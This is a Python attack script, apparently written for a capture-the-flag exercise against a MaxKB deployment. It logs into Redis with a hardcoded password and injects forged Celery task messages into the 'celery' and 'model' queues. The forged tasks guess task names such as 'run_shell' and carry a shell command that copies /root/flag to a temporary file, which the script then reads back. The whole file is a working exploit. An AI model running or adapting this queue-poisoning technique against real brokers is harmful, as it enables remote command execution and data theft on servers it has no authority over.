import redis
import json

def exploit_direct_queues():
    to_return = ""
    
    try:
        r = redis.Redis(
            host='0.0.0.0',
            port=6379,
            password='Password123@redis',
            db=0
        )
        
        to_return += "Connected to Redis\n"
        
        # Используем информацию о очередях
        queues = ['celery', 'model']
        
        # Создаем задачи для каждой очереди
        task_template = {
            'task': 'execute',  # Попробуем common имена
            'id': 'exploit-task',
            'args': ['cat /root/flag > /tmp/direct_queue_flag.txt'],
            'kwargs': {},
        }
        
        # Альтернативные имена задач которые могут быть в MaxKB
        possible_tasks = [
            'execute_command',
            'run_shell',
            'system_command',
            'maxkb.tasks.execute',
            'heartbeat',  # Из импорта heartbeat
        ]
        
        for queue in queues:
            for task_name in possible_tasks:
                try:
                    task = task_template.copy()
                    task['task'] = task_name
                    
                    r.lpush(queue, json.dumps(task))
                    to_return += f"Sent {task_name} to {queue} queue\n"
                except Exception as e:
                    to_return += f"Failed to send {task_name} to {queue}: {e}\n"
        
        # time.sleep(5)
        
        # Проверяем результат
        try:
            with open('/tmp/direct_queue_flag.txt', 'r') as f:
                content = f.read().strip()
                if content:
                    to_return += f"SUCCESS! Flag: {content}\n"
        except:
            to_return += "Flag file not created\n"
            
    except Exception as e:
        to_return += f"Redis connection failed: {e}\n"
    
    return to_return

exploit_direct_queues()